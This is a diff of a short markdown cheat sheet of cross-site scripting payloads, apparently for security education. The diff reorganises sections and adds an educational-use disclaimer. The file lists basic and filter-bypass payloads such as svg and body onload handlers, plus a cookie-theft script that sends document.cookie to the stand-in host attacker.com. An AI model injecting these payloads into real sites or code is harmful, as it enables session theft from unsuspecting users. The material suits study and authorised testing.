@@ -1,4 +1,9 @@
-# 💣 XSS Payloads
+# 💣 XSS Payload Reference
+
+## ⚠️ Note
+Payloads are for educational purposes in controlled environments only.
+
+---
 
 ## 🔰 Basic Payloads
 
@@ -9,19 +14,11 @@
 
 ---
 
-## 🔓 Bypass Filters
+## 🔓 Filter Bypass Payloads
 
 ```html
 <svg onload=alert(1)>
 <body onload=alert(1)>
-```
-
----
-
-## 🍪 Cookie Theft
-
-```html
-<script>document.location='http://attacker.com?cookie='+document.cookie</script>
 ```
 
 ---
@@ -35,6 +32,30 @@
 
 ---
 
-## ⚠️ Notes
-- Payloads vary based on filters
-- Always test in safe environments
+## 🍪 Cookie Theft
+
+```html
+<script>document.location='http://attacker.com?cookie='+document.cookie</script>
+```
+
+---
+
+## 🧠 Why Payloads Vary
+
+Depends on:
+- filtering rules
+- context of injection
+- browser behavior
+
+---
+
+## ❌ Common Mistake
+
+Using only one payload without understanding context.
+
+---
+
+## 🧾 Key Takeaways
+
+- payload success depends on context
+- testing must be iterative
